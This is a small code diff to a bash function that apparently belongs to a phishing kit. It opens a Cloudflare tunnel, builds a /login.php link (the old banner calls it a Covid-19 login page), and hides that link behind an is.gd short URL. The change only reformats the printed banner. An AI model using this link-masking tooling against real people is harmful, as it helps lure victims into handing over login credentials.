@@ -572,10 +572,9 @@ cloudflared_start() {
 cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
 url_0="${cldflr_url}/login.php"
 url0=$(curl -s 'https://is.gd/create.php?format=simple&url='"$url_0")
-echo -e "${RED}============================"
-echo -e "${WHITE}  LOGIN PAGE [Covid-19]"
-echo -e "${GREEN}$url0"
-echo -e "${RED}==========================="
+echo -e "${RED}=========================================="
+echo -e "|         ${GREEN}$url0"
+echo -e "${RED}========================================="
 
 }
 
